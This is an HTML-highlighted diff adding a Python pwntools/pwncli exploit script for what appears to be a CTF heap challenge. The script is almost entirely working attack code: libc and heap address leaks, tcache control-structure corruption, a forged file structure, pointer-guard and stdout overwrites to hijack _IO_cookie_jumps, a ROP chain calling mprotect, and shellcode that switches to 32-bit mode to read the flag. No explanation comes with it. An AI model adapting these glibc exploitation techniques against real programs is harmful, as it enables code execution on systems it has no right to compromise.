+</span></span><span class="line"><span class="cl"><span class="c1"># -*- encoding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># author: roderick</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">mmap</span> <span class="kn">import</span> <span class="n">mmap</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">isort</span> <span class="kn">import</span> <span class="n">file</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwncli</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cli_script</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="p">:</span> <span class="n">tube</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;io&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;elf&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="p">:</span> <span class="n">ELF</span> <span class="o">=</span> <span class="n">gift</span><span class="p">[</span><span class="s1">&#39;libc&#39;</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">username</span> <span class="o">=</span> <span class="s2">&#34;roderick&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">create_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">len</span><span class="o">=</span><span class="mh">0x18</span><span class="p">,</span> <span class="n">r</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">w</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">x</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;create</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please file (file_name file_protect file_length) : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">w</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">delete_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;delete</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input the file&#39;s name you want to delete : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">open_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">r</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">w</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">x</span><span class="o">=</span><span class="mi">1</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;open</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input the file name you want to open : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">r</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">w</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="s2">&#34;0&#34;</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">close_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;close</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input the file name you want to close : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read_file</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;read</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input the file name you want to read : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">write_file</span><span class="p">(</span><span class="n">filename</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">encode</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">    <span class="n">filename</span> <span class="o">=</span> <span class="n">filename</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;write</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input the file name you want to write : &#34;</span><span class="p">,</span> <span class="n">filename</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">bye</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;-&gt;</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="s2">&gt;&gt;&#34;</span><span class="p">,</span> <span class="s2">&#34;exit</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please choose user to login : </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="s2">&#34;baduser&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please input  user name : </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">sa</span><span class="p">(</span><span class="s2">&#34;Please choose user to login : </span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">username</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack2&#34;</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">close_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># leak libc addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">libc_base</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mi">9</span><span class="p">)[</span><span class="mi">1</span><span class="p">:])</span> <span class="o">-</span> <span class="mh">0x219cc0</span>
+</span></span><span class="line"><span class="cl"><span class="n">set_current_libc_base_and_log</span><span class="p">(</span><span class="n">libc_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">-</span> <span class="mh">0x2890</span> <span class="c1"># local debug</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">gift</span><span class="o">.</span><span class="n">remote</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ptr_guard</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x2295f0</span> <span class="c1"># buu</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">io_cookie_jump</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x215b80</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete_file</span><span class="p">(</span><span class="s2">&#34;hack2&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">close_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">write_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># leak heap addr</span>
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span> <span class="o">=</span> <span class="n">u64_ex</span><span class="p">(</span><span class="n">rn</span><span class="p">(</span><span class="mh">0x19</span><span class="p">)[</span><span class="o">-</span><span class="mi">8</span><span class="p">:])</span> <span class="o">-</span> <span class="mh">0x380</span>
+</span></span><span class="line"><span class="cl"><span class="n">log_heap_base_addr</span><span class="p">(</span><span class="n">heap_base</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete_file</span><span class="p">(</span><span class="s2">&#34;hack1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># clear free chunk</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">create_file</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;hack</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">open_file</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;hack</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">close_file</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;hack</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack5&#34;</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack5&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000165fa0: mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000059fa0: mov rsp, rdx; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x0000000000045f85: add rsp, 0x28; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000002a6c5: pop rdi; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000005f65a: pop rdx; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># 0x000000000002c081: pop rsi; ret;</span>
+</span></span><span class="line"><span class="cl"><span class="n">lower_addr</span> <span class="o">=</span> <span class="p">(</span><span class="n">heap_base</span><span class="o">&amp;~</span><span class="mh">0xfff</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xfffffff</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:[</span> <span class="c1"># rdi</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000045f85</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xab0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x20</span><span class="p">:</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000059fa0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x30</span><span class="p">:</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002a6c5</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">heap_base</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000002c081</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mh">0x8000</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x000000000005f65a</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="mi">7</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">mprotect</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xab0</span> <span class="o">+</span> <span class="mh">0x100</span>
+</span></span><span class="line"><span class="cl">    <span class="p">],</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x100</span><span class="p">:</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">linux</span><span class="o">.</span><span class="n">mmap_rwx</span><span class="p">(</span><span class="mh">0x10000</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="n">lower_addr</span><span class="p">)</span> <span class="o">+</span>
+</span></span><span class="line"><span class="cl">            <span class="n">shellcraft</span><span class="o">.</span><span class="n">amd64</span><span class="o">.</span><span class="n">memcpy</span><span class="p">(</span><span class="n">lower_addr</span><span class="o">+</span><span class="mh">0x800</span><span class="p">,</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xab0</span> <span class="o">+</span> <span class="mh">0x200</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)</span> <span class="o">+</span> <span class="sa">f</span><span class="s2">&#34;&#34;&#34;
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov rax, </span><span class="si">{</span><span class="n">lower_addr</span><span class="o">+</span><span class="mh">0x800</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            mov rsp, rax
+</span></span></span><span class="line"><span class="cl"><span class="s2">            push 0x23
+</span></span></span><span class="line"><span class="cl"><span class="s2">            push </span><span class="si">{</span><span class="n">lower_addr</span><span class="o">+</span><span class="mh">0x800</span><span class="o">+</span><span class="mh">0x10</span><span class="si">}</span><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">            retfq
+</span></span></span><span class="line"><span class="cl"><span class="s2">            &#34;&#34;&#34;</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x200</span><span class="p">:</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x90</span><span class="s2">&#34;</span><span class="o">*</span><span class="mi">20</span> <span class="o">+</span> <span class="n">ShellcodeMall</span><span class="o">.</span><span class="n">i386</span><span class="o">.</span><span class="n">cat_flag</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">})</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read_file</span><span class="p">(</span><span class="s2">&#34;hack5&#34;</span><span class="p">,</span> <span class="n">flat</span><span class="p">({</span><span class="mh">0x150</span><span class="p">:</span> <span class="n">payload</span><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;hack6&#34;</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># gap</span>
+</span></span><span class="line"><span class="cl"><span class="n">close_file</span><span class="p">(</span><span class="s2">&#34;hack5&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;hack7&#34;</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">)</span> <span class="c1"># fake file</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># fake file </span>
+</span></span><span class="line"><span class="cl"><span class="n">read_file</span><span class="p">(</span><span class="s2">&#34;hack5&#34;</span><span class="p">,</span> <span class="n">data</span> <span class="o">=</span> <span class="n">flat</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span><span class="s2">&#34;hack7</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x14</span><span class="p">:</span><span class="mh">0x010101010101</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x1c</span><span class="p">:</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x280</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x28</span><span class="p">:</span> <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x10</span> <span class="c1"># next_file</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># free tcache-control-struct</span>
+</span></span><span class="line"><span class="cl"><span class="n">delete_file</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">delete_file</span><span class="p">(</span><span class="s2">&#34;hack6&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack7&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">read_file</span><span class="p">(</span><span class="s2">&#34;hack7&#34;</span><span class="p">,</span> <span class="n">flat_z</span><span class="p">({</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">:</span><span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xe</span><span class="p">:</span> <span class="s2">&#34;</span><span class="se">\x01</span><span class="s2">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0x80</span><span class="p">:</span> <span class="n">ptr_guard</span><span class="p">,</span> <span class="c1"># 0x20 chunk</span>
+</span></span><span class="line"><span class="cl">    <span class="mh">0xb8</span><span class="p">:</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span><span class="o">+</span><span class="mh">0xd0</span> <span class="c1"># 0x90 chunk</span>
+</span></span><span class="line"><span class="cl"><span class="p">}))</span>
+</span></span><span class="line"><span class="cl"><span class="n">create_file</span><span class="p">(</span><span class="s2">&#34;hack8&#34;</span><span class="p">,</span> <span class="mh">0x88</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">open_file</span><span class="p">(</span><span class="s2">&#34;hack8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">read_file</span><span class="p">(</span><span class="s2">&#34;hack8&#34;</span><span class="p">,</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">    <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">io_cookie_jump</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">,</span> <span class="c1"># vtable</span>
+</span></span><span class="line"><span class="cl">    <span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0xab0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="o">.</span><span class="n">_IO_2_1_stdout_</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="n">rol</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x0000000000165fa0</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">
